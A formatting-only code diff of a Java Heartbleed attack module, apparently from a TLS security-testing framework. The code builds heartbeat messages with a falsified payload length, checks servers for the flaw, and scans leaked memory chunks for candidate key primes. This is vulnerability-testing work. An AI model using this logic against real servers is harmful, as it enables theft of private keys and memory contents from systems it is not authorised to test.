@@ -208,16 +208,16 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
     private List<ProtocolMessage> getHeartbeatMessages() {
         Config tlsConfig = getTlsConfig();
         WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig).createWorkflowTrace(WorkflowTraceType.HELLO,
-                                                                                              RunningModeType.CLIENT);
+            RunningModeType.CLIENT);
         State state = setTraceAndGetState(trace, tlsConfig);
         // LOGGER.info("Trace Action count:" + trace.getTlsActions().size());
         try {
             WorkflowExecutor workflowExecutor =
-                    WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), state);
+                WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), state);
             workflowExecutor.executeWorkflow();
         } catch (WorkflowExecutionException ex) {
             LOGGER.info(
-                    "The TLS protocol flow was not executed completely, follow the debug messages for more information.");
+                "The TLS protocol flow was not executed completely, follow the debug messages for more information.");
             LOGGER.debug(ex);
         }
         // WorkflowTraceUtil.getAllReceivedRecords(trace, ProtocolMessageType.HEARTBEAT);
@@ -284,13 +284,13 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
              * BigInteger(primeString)); }
              */// TODO: ending of testing code
 
-            BigInteger first = new BigInteger(1, new byte[]{chunk[0]});
+            BigInteger first = new BigInteger(1, new byte[] { chunk[0] });
             if (ZERO.equals(first.mod(BigInteger.valueOf(2)))) {
                 LOGGER.debug("Skipping even number = " + chunk[0]);
                 continue;
             }
 
-            BigInteger last = new BigInteger(1, new byte[]{chunk[chunk.length - 1]});
+            BigInteger last = new BigInteger(1, new byte[] { chunk[chunk.length - 1] });
             if (ZERO.equals(last)) {
                 LOGGER.debug("Skipping number ending with zero =" + last);
                 continue;
@@ -351,7 +351,7 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
     public Boolean isVulnerable() {
         Config tlsConfig = getTlsConfig();
         WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig)
-                .createWorkflowTrace(WorkflowTraceType.DYNAMIC_HELLO, RunningModeType.CLIENT);
+            .createWorkflowTrace(WorkflowTraceType.DYNAMIC_HELLO, RunningModeType.CLIENT);
         trace.addTlsAction(new SendDynamicClientKeyExchangeAction());
         trace.addTlsAction(new SendAction(new ChangeCipherSpecMessage(), new FinishedMessage()));
         trace.addTlsAction(new ReceiveAction(new ChangeCipherSpecMessage(), new FinishedMessage()));
@@ -363,30 +363,30 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
         ModifiableInteger payloadLength = new ModifiableInteger();
         payloadLength.setModification(IntegerModificationFactory.explicitValue(config.getPayloadLength()));
         ModifiableByteArray payload = new ModifiableByteArray();
-        payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[]{1, 3}));
+        payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[] { 1, 3 }));
         message.setHeartbeatMessageType(heartbeatMessageType);
         message.setPayload(payload);
         message.setPayloadLength(payloadLength);
 
         try {
             WorkflowExecutor workflowExecutor =
-                    WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), state);
+                WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), state);
             workflowExecutor.executeWorkflow();
         } catch (WorkflowExecutionException ex) {
             LOGGER.info(
-                    "The TLS protocol flow was not executed completely, follow the debug messages for more information.");
+                "The TLS protocol flow was not executed completely, follow the debug messages for more information.");
             LOGGER.debug(ex);
         }
 
         if (WorkflowTraceUtil.didReceiveMessage(HEARTBEAT, trace)) {
             LOGGER.info(
-                    "Vulnerable. The server responds with a heartbeat message, although the client heartbeat message contains an invalid Length value");
+                "Vulnerable. The server responds with a heartbeat message, although the client heartbeat message contains an invalid Length value");
             return true;
         } else if (!WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.FINISHED, trace)) {
             return null;
         } else {
             LOGGER.info(
-                    "(Most probably) Not vulnerable. The server does not respond with a heartbeat message, it is not vulnerable");
+                "(Most probably) Not vulnerable. The server does not respond with a heartbeat message, it is not vulnerable");
             return false;
         }
     }
@@ -396,7 +396,7 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
         State state = null;
         // trace.addTlsAction(new ReceiveTillAction(new ServerHelloDoneMessage()));
         trace.addTlsAction(new SendAction(new ECDHClientKeyExchangeMessage(tlsConfig),
-                                          new ChangeCipherSpecMessage(tlsConfig), new FinishedMessage(tlsConfig)));
+            new ChangeCipherSpecMessage(tlsConfig), new FinishedMessage(tlsConfig)));
         trace.addTlsAction(new GenericReceiveAction());
         /*
          * trace.addTlsAction(new SendDynamicClientKeyExchangeAction()); trace.addTlsAction(new SendAction(new
@@ -413,7 +413,7 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
             ModifiableInteger payloadLength = new ModifiableInteger();
             payloadLength.setModification(IntegerModificationFactory.explicitValue(config.getPayloadLength()));
             ModifiableByteArray payload = new ModifiableByteArray();
-            payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[]{1, 3}));
+            payload.setModification(ByteArrayModificationFactory.explicitValue(new byte[] { 1, 3 }));
             message.setHeartbeatMessageType(heartbeatMessageType);
             message.setPayload(payload);
             message.setPayloadLength(payloadLength);
@@ -422,10 +422,10 @@ public class HeartbleedAttacker extends Attacker<HeartbleedCommandConfig> {
             if (i % 10 == 0) {
                 // HTTP request
                 MessageAction action = MessageActionFactory.createAction(tlsConfig, connection,
-                                                                         ConnectionEndType.CLIENT, new HttpsRequestMessage(tlsConfig));
+                    ConnectionEndType.CLIENT, new HttpsRequestMessage(tlsConfig));
                 trace.addTlsAction(action);
                 action = MessageActionFactory.createAction(tlsConfig, connection, ConnectionEndType.SERVER,
-                                                           new HttpsResponseMessage(tlsConfig));
+                    new HttpsResponseMessage(tlsConfig));
                 trace.addTlsAction(action);
             }
         }
